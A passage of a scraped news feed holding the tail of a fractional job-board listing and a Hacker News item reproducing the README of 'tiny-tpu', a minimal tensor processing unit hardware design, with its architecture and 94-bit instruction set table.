hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Hybrid (SF)</p><div><p>Marketing</p><p>Syndicated</p><p>August 4, 2025</p><p>field-marketing-lead-at-rec</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Digital United</h3><h3>&nbsp;-&nbsp;</h3><h3>Financial Consultant</h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Finance</p><p>Syndicated</p><p>August 4, 2025</p><p>financial-consultant-at-digital-united</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Phoenix3</h3><h3>&nbsp;-&nbsp;</h3><h3>General Counsel </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Onsite (Waltham, MA)</p><div><p>Legal</p><p>Syndicated</p><p>August 4, 2025</p><p>general-counsel-at-phoenix3</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Sincere</h3><h3>&nbsp;-&nbsp;</h3><h3>PR Manager </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Hybrid (Boston)</p><div><p>Marketing</p><p>Syndicated</p><p>August 4, 2025</p><p>pr-manager-at-sincere</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>White Snake Projects</h3><h3>&nbsp;-&nbsp;</h3><h3>Major Gift Officer </h3></p></div><div><p>12 hrs</p><p>&nbsp;|&nbsp;</p><p>$3000 / mo.</p><p>&nbsp;|&nbsp;</p><p>Onsite (Boston)</p><div><p>Other</p><p>Syndicated</p><p>August 4, 2025</p><p>major-gift-officer-at-white-snake-projects</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Home Maintenance Concierge Startup</h3><h3>&nbsp;-&nbsp;</h3><h3>Director of Marketing</h3></p></div><div><p>10 - 15 hrs</p><p>&nbsp;|&nbsp;</p><p>$150 - $175 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA / Canada only)</p><div><p>Marketing</p><p>Syndicated</p><p>August 1, 2025</p><p>director-of-marketing-at-a-home-maintenance-concierge-startup</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Totally Flawless</h3><h3>&nbsp;-&nbsp;</h3><h3>Lead Mobile Engineer</h3></p></div><div><p>15 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>$80 - $100 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA only)</p><div><p>Engineering</p><p>Syndicated</p><p>July 28, 2025</p><p>lead-mobile-engineer-at-totally-flawless</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Marshall Medical Group</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Marketing Officer</h3></p></div><div><p>20 hrs</p><p>&nbsp;|&nbsp;</p><p>$4K - $6K / mo</p><p>&nbsp;|&nbsp;</p><p>Hybrid (Lexington, KY)</p><div><p>Marketing</p><p>Syndicated</p><p>July 28, 2025</p><p>chief-marketing-officer-at-marshall-medical-group</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Flashii </h3><h3>&nbsp;-&nbsp;</h3><h3>VP of Sales </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Sales</p><p>Syndicated</p><p>July 28, 2025</p><p>vice-president-of-sales-at-flashii--fg829</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Nexture Bio</h3><h3>&nbsp;-&nbsp;</h3><h3>Sales Lead </h3></p></div><div><p>8 - 15 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Hybrid (Sacramento)</p><div><p>Sales</p><p>Syndicated</p><p>July 28, 2025</p><p>sales-lead-at-nexture-bio</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A NYC Hospitality Group</h3><h3>&nbsp;-&nbsp;</h3><h3>Head of People Operations</h3></p></div><div><p>5 - 10 hrs</p><p>&nbsp;|&nbsp;</p><p>$125 - $175 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA only)</p><div><p>People</p><p>Syndicated</p><p>July 28, 2025</p><p>head-of-people-operations-at-a-nyc-hospitality-group</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>SE10 PR</h3><h3>&nbsp;-&nbsp;</h3><h3>New Business Development </h3></p></div><div><p>10 - 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Sales</p><p>Syndicated</p><p>July 28, 2025</p><p>new-business-development-at-se10-pr</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>Mod Ventures LLC</h3><h3>&nbsp;-&nbsp;</h3><h3>Chief Operations &amp; Financial Officer </h3></p></div><div><p> 10 – 20 hrs</p><p>&nbsp;|&nbsp;</p><p>Unknown</p><p>&nbsp;|&nbsp;</p><p>Remote</p><div><p>Operations</p><p>Syndicated</p><p>July 28, 2025</p><p>chief-operations-financial-officer-at-mod-ventures-llc</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>An HR-tech Analytics Platform</h3><h3>&nbsp;-&nbsp;</h3><h3>Staff Frontend Engineer</h3></p></div><div><p>20 - 40 hrs</p><p>&nbsp;|&nbsp;</p><p>$120 - $180 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (USA / Canada only)</p><div><p>Engineering</p><p>Syndicated</p><p>May 27, 2025</p><p>staff-frontend-engineer-at-an-hr-tech-analytics-platform</p></div></div></div></div><div role="listitem"><div tabindex="0" role="button" aria-roledescription="open-modal-trigger" aria-controls="fs-modal-1-popup" aria-haspopup="dialog" aria-expanded="false" data-w-id="9e108133-0d83-1535-4f7b-7f859e2881ab"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/661a6911701485a8909acb22_star.svg" loading="lazy" alt=""></p></div><div><div><p><h3>A Boutique Fractional CFO Firm</h3><h3>&nbsp;-&nbsp;</h3><h3>FP&amp;A Lead</h3></p></div><div><p>10 - 15 hrs</p><p>&nbsp;|&nbsp;</p><p>$80 - $120 / hr</p><p>&nbsp;|&nbsp;</p><p>Remote (Worldwide)</p><div><p>Finance</p><p>Syndicated</p><p>April 23, 2025</p><p>fp-a-lead-at-a-boutique-fractional-cfo-firm</p></div></div></div></div></div><div><div id="w-node-_9e108133-0d83-1535-4f7b-7f859e2881d8-075f0119"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/65b262a0934f65c19a253d80_email%201%20(2)%20(1).webp" loading="lazy" alt=""></p></div><div id="source-fractional-section"><div><p><h3>No <span id="job-placeholder">jobs</span>... yet. Get emailed when the next one goes live.</h3></p><p>This is a spam-free zone.</p></div><div><div id="success-message-2"><div><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/65ad278adba71fccff520329_Frame%2063.svg" loading="lazy" alt=""></p><p>You’re in! Check your inbox to confirm.</p></div><div><p>We also post job alerts on</p></div></div><div id="error-message-2"><p>Hhmm, try again. That didn’t work.</p></div></div></div></div><div><div id="w-node-_9e108133-0d83-1535-4f7b-7f859e288228-075f0119"><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/65b262a0934f65c19a253d80_email%201%20(2)%20(1).webp" loading="lazy" alt=""></p></div><div id="source-fractional-section"><div><p><h3>Fractional Job Alerts&nbsp; </h3><h3>In Your Inbox</h3><h3> Weekly.</h3></p><p>This is a spam-free zone.</p></div><div><div id="success-message-2"><div><p><img src="https://cdn.prod.website-files.com/6578c49d9871fac26dd7700e/65ad278adba71fccff520329_Frame%2063.svg" loading="lazy" alt=""></p><p>You’re in! Check your inbox to confirm.</p></div><div><p>We also post job alerts on</p></div></div><div id="error-message-2"><p>Hhmm, try again. That didn’t work.</p></div></div></div></div></div></div></div><div><div><h2>Playbooks</h2></div><div id="w-node-_9e108133-0d83-1535-4f7b-7f859e2882c3-075f0119"><h3>Want to Read More?</h3><div><p>Everything you need to go from zero to fractional operator, quickly.</p></div></div></div><div><div><h2>And More...</h2></div><div><div id="w-node-e444a3f1-5c67-c955-450c-0b68c7dfb507-c7dfb4fd"><h3>The Toolkit</h3><div><p>The tools and communities we recommend to help you build a successful fractional practice.</p></div></div><div id="w-node-e444a3f1-5c67-c955-450c-0b68c7dfb512-c7dfb4fd"><h3>The Blog</h3><div><p>Our latest thoughts and news related to the fractional world. Featuring select community members, too!</p></div></div></div></div><div id="contact"><p><h2>Contact Us</h2></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A minimal tensor processing unit (TPU), inspired by Google's TPU (250 pts)]]></title>
            <link>https://github.com/tiny-tpu-v2/tiny-tpu</link>
            <guid>44945008</guid>
            <pubDate>Mon, 18 Aug 2025 20:34:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/tiny-tpu-v2/tiny-tpu">https://github.com/tiny-tpu-v2/tiny-tpu</a>, See on <a href="https://news.ycombinator.com/item?id=44945008">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">tiny-tpu</h2><a id="user-content-tiny-tpu" aria-label="Permalink: tiny-tpu" href="#tiny-tpu"></a></p>
<p dir="auto">A minimal tensor processing unit (TPU), reinvented from Google's TPU V2 and V1.</p>
<details open="">
  <summary>
    
    <span aria-label="Video description tinytpu.mp4">tinytpu.mp4</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/110429254/479205816-b5d6aefe-4250-4c6d-866e-65d519e4de74.mp4?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTU1NzgxMDIsIm5iZiI6MTc1NTU3NzgwMiwicGF0aCI6Ii8xMTA0MjkyNTQvNDc5MjA1ODE2LWI1ZDZhZWZlLTQyNTAtNGM2ZC04NjZlLTY1ZDUxOWU0ZGU3NC5tcDQ_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwODE5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDgxOVQwNDMwMDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xOTgxMjEzMmMzYjgwNzI1NzhkNzYyMjM2NjFhMmU5Njg4NDIzOTkzMzBmNTZiYzI3M2VlZDRhOWI0NWJiNzBlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.G-NWijGwV-znD7kaoLTWLXXtUFX6CElnqDWxOM3gfsk" data-canonical-src="https://private-user-images.githubusercontent.com/110429254/479205816-b5d6aefe-4250-4c6d-866e-65d519e4de74.mp4?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTU1NzgxMDIsIm5iZiI6MTc1NTU3NzgwMiwicGF0aCI6Ii8xMTA0MjkyNTQvNDc5MjA1ODE2LWI1ZDZhZWZlLTQyNTAtNGM2ZC04NjZlLTY1ZDUxOWU0ZGU3NC5tcDQ_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwODE5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDgxOVQwNDMwMDJaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xOTgxMjEzMmMzYjgwNzI1NzhkNzYyMjM2NjFhMmU5Njg4NDIzOTkzMzBmNTZiYzI3M2VlZDRhOWI0NWJiNzBlJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.G-NWijGwV-znD7kaoLTWLXXtUFX6CElnqDWxOM3gfsk" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><h2 tabindex="-1" dir="auto">Table of Contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of Contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#motivation">Motivation</a></li>
<li><a href="#architecture">Architecture</a>
<ul dir="auto">
<li><a href="#processing-element-pe">Processing Element (PE)</a></li>
<li><a href="#systolic-array">Systolic Array</a></li>
<li><a href="#vector-processing-unit-vpu">Vector Processing Unit (VPU)</a></li>
<li><a href="#unified-buffer-ub">Unified Buffer (UB)</a></li>
<li><a href="#control-unit">Control Unit</a></li>
</ul>
</li>
<li><a href="#instruction-set">Instruction Set</a></li>
<li><a href="#example-instruction-sequence">Example Instruction Sequence</a></li>
<li><a href="#future-steps">Future Steps</a></li>
<li><a href="#setup">Setup</a>
<ul dir="auto">
<li><a href="#macos-specific">MacOS specific</a></li>
<li><a href="#ubuntu-specific">Ubuntu specific</a></li>
</ul>
</li>
<li><a href="#adding-a-new-module-to-the-tiny-tpu">Adding a new module to the tiny-tpu</a>
<ul dir="auto">
<li><a href="#1-create-the-module-file">1. Create the module file</a></li>
<li><a href="#2-create-the-dump-file">2. Create the dump file</a></li>
<li><a href="#3-create-the-test-file">3. Create the test file</a></li>
<li><a href="#4-update-the-makefile">4. Update the Makefile</a></li>
<li><a href="#5-view-waveforms">5. View waveforms</a></li>
</ul>
</li>
<li><a href="#running-commands-from-makefile">Running commands from Makefile</a></li>
<li><a href="#fixed-point-viewing-in-gtkwave">Fixed point viewing in gtkwave</a></li>
<li><a href="#what-is-a-gtkw-file">What is a gtkw file?</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Architecture</h2><a id="user-content-architecture" aria-label="Permalink: Architecture" href="#architecture"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/tiny-tpu-v2/tiny-tpu/blob/main/images/tpu.png"><img src="https://github.com/tiny-tpu-v2/tiny-tpu/raw/main/images/tpu.png" alt="TPU Architecture"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Processing Element (PE)</h3><a id="user-content-processing-element-pe" aria-label="Permalink: Processing Element (PE)" href="#processing-element-pe"></a></p>
<ul dir="auto">
<li><strong>Function</strong>: Performs a multiply-accumulate operation every clock cycle</li>
<li><strong>Data Flow</strong>:
<ul dir="auto">
<li>Incoming data is multiplied by a stored weight and added to an incoming partial sum to produce an output sum</li>
<li>Incoming data also passes through to the next element for propagation across the array</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Systolic Array</h3><a id="user-content-systolic-array" aria-label="Permalink: Systolic Array" href="#systolic-array"></a></p>
<ul dir="auto">
<li><strong>Architecture</strong>: A grid of processing elements, starting from 2x2</li>
<li><strong>Data Movement</strong>:
<ul dir="auto">
<li>Input values flow horizontally across the array</li>
<li>Partial sums flow vertically down the array</li>
<li>Weights remain fixed within each processing element during computation</li>
</ul>
</li>
<li><strong>Input Preprocessing</strong>:
<ul dir="auto">
<li>Input matrices are rotated 90 degrees (implemented in hardware)</li>
<li>Inputs are staggered for correct computation in the systolic array</li>
<li>Weight matrices are transposed and staggered to align with mathematical formulas</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Vector Processing Unit (VPU)</h3><a id="user-content-vector-processing-unit-vpu" aria-label="Permalink: Vector Processing Unit (VPU)" href="#vector-processing-unit-vpu"></a></p>
<ul dir="auto">
<li>Performs element-wise operations after the systolic array</li>
<li><strong>Control</strong>: Module selection depends on the computation stage</li>
<li><strong>Modules (pipelined)</strong>:
<ol dir="auto">
<li>Bias addition</li>
<li>Leaky ReLU activation function</li>
<li>MSE loss</li>
<li>Leaky ReLU derivative</li>
</ol>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Unified Buffer (UB)</h3><a id="user-content-unified-buffer-ub" aria-label="Permalink: Unified Buffer (UB)" href="#unified-buffer-ub"></a></p>
<ul dir="auto">
<li>Dual-port memory for storing intermediate values</li>
<li><strong>Stored Data</strong>:
<ul dir="auto">
<li>Input matrices</li>
<li>Weight matrices</li>
<li>Bias vectors</li>
<li>Post-activation values for backpropagation</li>
<li>Activation leak factors</li>
<li>Inverse batch size constant for MSE backpropagation</li>
</ul>
</li>
<li><strong>Interface</strong>:
<ul dir="auto">
<li>Two read and two write ports per data type</li>
<li>Data is accessed by specifying a start address and count</li>
<li>Reads can occur continuously in the background until the requested count is reached</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Control Unit</h3><a id="user-content-control-unit" aria-label="Permalink: Control Unit" href="#control-unit"></a></p>
<ul dir="auto">
<li><strong>Instruction width</strong>: 94 bits</li>
<li>See <a href="#instruction-set">Instruction Set</a> section below for more information.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Instruction Set</h2><a id="user-content-instruction-set" aria-label="Permalink: Instruction Set" href="#instruction-set"></a></p>
<p dir="auto">Our ISA is 94 bits wide. The full image is available in the <code>images/</code> folder.</p>
<p dir="auto">Our ISA defines all necessary signals for transferring data and interacting with our TPU. The implementation of the control unit (which reads instructions) can be found at <code>src/control_unit.sv</code>.</p>
<p dir="auto">The <code>instruction</code> bus is <strong>94 bits wide</strong> (<code>[93:0]</code>) and is divided into fields that directly control subsystems.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [0–4]: 1-bit Control Signals</h3><a id="user-content-bits-04-1-bit-control-signals" aria-label="Permalink: Bits [0–4]: 1-bit Control Signals" href="#bits-04-1-bit-control-signals"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Bit</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td><code>sys_switch_in</code></td>
<td>System mode switch (general-purpose "on/off" CU)</td>
<td><code>1 = system active</code>, <code>0 = idle</code></td>
</tr>
<tr>
<td>1</td>
<td><code>ub_rd_start_in</code></td>
<td>Start UB (Unified Buffer) read transaction</td>
<td><code>1 = trigger read</code>, <code>0 = no read</code></td>
</tr>
<tr>
<td>2</td>
<td><code>ub_rd_transpose</code></td>
<td>UB read transpose mode</td>
<td><code>1 = transpose</code>, <code>0 = normal</code></td>
</tr>
<tr>
<td>3</td>
<td><code>ub_wr_host_valid_in_1</code></td>
<td>Host write channel 1 valid flag</td>
<td><code>1 = write valid</code>, <code>0 = not valid</code></td>
</tr>
<tr>
<td>4</td>
<td><code>ub_wr_host_valid_in_2</code></td>
<td>Host write channel 2 valid flag</td>
<td><code>1 = write valid</code>, <code>0 = not valid</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [6:5]: UB Read Column Size (2-bit)</h3><a id="user-content-bits-65-ub-read-column-size-2-bit" aria-label="Permalink: Bits [6:5]: UB Read Column Size (2-bit)" href="#bits-65-ub-read-column-size-2-bit"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[6:5]</td>
<td><code>ub_rd_col_size</code></td>
<td>Number of columns to read</td>
<td><code>00=0</code>, <code>01=1</code>, <code>10=2</code>, <code>11=3</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [14:7]: UB Read Row Size (8-bit)</h3><a id="user-content-bits-147-ub-read-row-size-8-bit" aria-label="Permalink: Bits [14:7]: UB Read Row Size (8-bit)" href="#bits-147-ub-read-row-size-8-bit"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[14:7]</td>
<td><code>ub_rd_row_size</code></td>
<td>Number of rows to read (0–255)</td>
<td><code>0x08 = read 8 rows</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [22:15]: UB Read Address (8-bit)</h3><a id="user-content-bits-2215-ub-read-address-8-bit" aria-label="Permalink: Bits [22:15]: UB Read Address (8-bit)" href="#bits-2215-ub-read-address-8-bit"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[22:15]</td>
<td><code>ub_rd_addr_in</code></td>
<td>UB read address (0–255)</td>
<td><code>0x10 = read bank 16</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [25:23]: UB Pointer Select (3-bit)</h3><a id="user-content-bits-2523-ub-pointer-select-3-bit" aria-label="Permalink: Bits [25:23]: UB Pointer Select (3-bit)" href="#bits-2523-ub-pointer-select-3-bit"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[25:23]</td>
<td><code>ub_ptr_sel</code></td>
<td>Selects UB pointer</td>
<td><code>3’b001 = route read ptr to bias module in VPU</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [41:26]: UB Write Host Data In 1 (16-bit, Fixed-Point)</h3><a id="user-content-bits-4126-ub-write-host-data-in-1-16-bit-fixed-point" aria-label="Permalink: Bits [41:26]: UB Write Host Data In 1 (16-bit, Fixed-Point)" href="#bits-4126-ub-write-host-data-in-1-16-bit-fixed-point"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[41:26]</td>
<td><code>ub_wr_host_data_in_1</code></td>
<td>First host write word</td>
<td><code>0xABCD</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [57:42]: UB Write Host Data In 2 (16-bit, Fixed-Point)</h3><a id="user-content-bits-5742-ub-write-host-data-in-2-16-bit-fixed-point" aria-label="Permalink: Bits [57:42]: UB Write Host Data In 2 (16-bit, Fixed-Point)" href="#bits-5742-ub-write-host-data-in-2-16-bit-fixed-point"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[57:42]</td>
<td><code>ub_wr_host_data_in_2</code></td>
<td>Second host write word</td>
<td><code>0x1234</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [61:58]: VPU Data Pathway (4-bit)</h3><a id="user-content-bits-6158-vpu-data-pathway-4-bit" aria-label="Permalink: Bits [61:58]: VPU Data Pathway (4-bit)" href="#bits-6158-vpu-data-pathway-4-bit"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[61:58]</td>
<td><code>vpu_data_pathway</code></td>
<td>Routing of data in VPU</td>
<td><code>0001=bias + relu routing</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [77:62]: Inverse Batch Size × 2 (16-bit, Fixed-Point)</h3><a id="user-content-bits-7762-inverse-batch-size--2-16-bit-fixed-point" aria-label="Permalink: Bits [77:62]: Inverse Batch Size × 2 (16-bit, Fixed-Point)" href="#bits-7762-inverse-batch-size--2-16-bit-fixed-point"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[77:62]</td>
<td><code>inv_batch_size_times_two_in</code></td>
<td>Precomputed scaling factor (2/batch)</td>
<td><code>0x0010 = (2/32)</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bits [93:78]: VPU Leak Factor (16-bit, Fixed-Point)</h3><a id="user-content-bits-9378-vpu-leak-factor-16-bit-fixed-point" aria-label="Permalink: Bits [93:78]: VPU Leak Factor (16-bit, Fixed-Point)" href="#bits-9378-vpu-leak-factor-16-bit-fixed-point"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Field</th>
<th>Signal</th>
<th>Meaning</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>[93:78]</td>
<td><code>vpu_leak_factor_in</code></td>
<td>Leak factor for activation (e.g., Leaky ReLU)</td>
<td><code>0x00A0 = 0.625</code></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
